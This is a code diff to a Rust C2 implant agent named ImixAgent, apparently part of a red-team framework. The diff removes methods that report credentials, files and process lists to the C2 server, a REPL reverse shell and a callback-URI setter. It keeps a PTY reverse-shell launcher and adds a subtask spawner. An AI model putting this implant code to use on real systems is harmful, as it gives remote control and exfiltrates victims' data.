@@ -1,5 +1,5 @@
 use anyhow::{Context, Result};
-use eldritch_libagent::agent::Agent;
+use eldritch_agent::Agent;
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
@@ -7,7 +7,7 @@ use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
 use transport::Transport;
 
-use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
+use crate::shell::run_reverse_shell_pty;
 use crate::task::TaskRegistry;
 
 #[derive(Clone)]
@@ -215,44 +215,6 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
 // Implement the Eldritch Agent Trait
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
-    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
-        self.with_transport(|mut t| async move {
-            // Transport uses std::sync::mpsc::Sender for fetch_asset
-            let (tx, rx) = std::sync::mpsc::channel();
-            t.fetch_asset(req, tx).await?;
-
-            let mut data = Vec::new();
-            while let Ok(resp) = rx.recv() {
-                data.extend(resp.chunk);
-            }
-            Ok(data)
-        })
-    }
-
-    fn report_credential(
-        &self,
-        req: c2::ReportCredentialRequest,
-    ) -> Result<c2::ReportCredentialResponse, String> {
-        self.with_transport(|mut t| async move { t.report_credential(req).await })
-    }
-
-    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
-        self.with_transport(|mut t| async move {
-            // Transport uses std::sync::mpsc::Receiver for report_file
-            let (tx, rx) = std::sync::mpsc::channel();
-            tx.send(req)?;
-            drop(tx);
-            t.report_file(rx).await
-        })
-    }
-
-    fn report_process_list(
-        &self,
-        req: c2::ReportProcessListRequest,
-    ) -> Result<c2::ReportProcessListResponse, String> {
-        self.with_transport(|mut t| async move { t.report_process_list(req).await })
-    }
-
     fn report_task_output(
         &self,
         req: c2::ReportTaskOutputRequest,
@@ -263,20 +225,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         Ok(c2::ReportTaskOutputResponse {})
     }
 
-    fn reverse_shell(&self) -> Result<(), String> {
-        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
-    }
-
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
             run_reverse_shell_pty(task_id, cmd, transport).await
-        })
-    }
-
-    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
-        let agent = self.clone();
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_repl_reverse_shell(task_id, transport, agent).await
         })
     }
 
@@ -358,10 +309,6 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             }
             Ok(())
         })
-    }
-
-    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
-        self.set_active_callback_uri(uri)
     }
 
     fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
@@ -453,6 +400,25 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             #[cfg(debug_assertions)]
             log::info!("Aborted subtask {task_id}");
         }
+        Ok(())
+    }
+
+    fn spawn_subtask(
+        &self,
+        task_id: i64,
+        _name: String,
+        future: eldritch_agent::SubtaskFuture,
+    ) -> Result<(), String> {
+        let subtasks = self.subtasks.clone();
+
+        let handle = self.runtime_handle.spawn(async move {
+            future.await;
+        });
+
+        if let Ok(mut map) = subtasks.lock() {
+            map.insert(task_id, handle);
+        }
+
         Ok(())
     }
 }
